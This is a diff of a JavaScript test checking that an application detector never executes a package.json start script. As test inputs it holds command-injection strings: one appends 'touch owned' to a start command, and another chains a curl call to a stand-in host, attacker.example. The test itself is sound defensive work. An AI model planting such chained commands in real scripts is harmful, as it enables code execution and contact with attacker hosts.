@@ -110,7 +110,8 @@ test('detection reports ambiguity and never executes a shell start command', asy
   const root = await fixture(t, { 'server.js': '', 'app.js': '' });
   await assert.rejects(detectApplication(root), /More than one/);
   await writeFile(join(root, 'package.json'), JSON.stringify({ scripts: { start: 'node server.js; touch owned' } }));
-  await assert.rejects(detectApplication(root), /could not be detected safely/);
+  assert.equal((await detectApplication(root)).kind,'container');
+  await assert.rejects(readFile(join(root,'owned')), {code:'ENOENT'});
   assert.equal(entryFromStart('NODE_ENV=production node --enable-source-maps server.js'), 'server.js');
   assert.equal(entryFromStart('node server.js && curl attacker.example'), null);
 });
